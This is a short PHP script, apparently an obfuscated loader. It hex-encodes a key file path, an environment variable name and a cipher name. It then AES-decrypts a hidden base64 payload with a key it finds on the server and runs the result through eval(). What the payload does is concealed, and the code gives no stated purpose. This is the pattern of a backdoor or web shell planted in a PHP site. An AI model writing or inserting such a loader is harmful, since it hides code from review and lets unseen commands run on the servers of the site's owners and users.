<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2Px/TCIQMmk4v4spHRKcDw==');

$c=base64_decode(

'o8PvGa9SPtBZJXQC+JZuVqgwehgmpinYUq4i7NpYbt7AIVyjT1BZeCy4BTO2EVs+jDghP1O5n1A3' .
'Nq6s/yconmWn7KrYAdUvSRPiYCy4KGIPttg4ArP5X07wubxqJw7+pPMYMqicv9H4cTu/n5lKnzQX' .
'TemaSFBUB6EmQBHnlo0ODk2+zTcJDDcQ2Urx99JloIfkR1Tltgm2/zrHYfiS/mQotDFQNCZ0k2A4' .
'9lM2CGYjjGXUx2GnSdYjSMPkxeNGFW8N44hJpttDyDXt3hoqSWjkqjwcD7vZh44sf7Drx1Dby5kD' .
'VnWmwxszhWycccOmJJ8TfWUg98py3TalF8Ikvl85eHnPRWpzyXBnlp7MxBQ7Q2+1bQEajS7l7GIQ' .
'98+fgWEx42uD3WpnJTKR/Z106cy8z2FYEhC+Nsojbwqrb7Dr7UPRRgzffqHuVIKR/A5dauyIRnNM' .
'uQ8tK8vDZ/uMFKZI6GSHE9EatR35w+QalU8QX8vqOQ8pEjDibwKhra+k5SWJt3DnG0pc48YaTumn' .
'GdaLxvGZS/1ONTusvDtCqg0='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

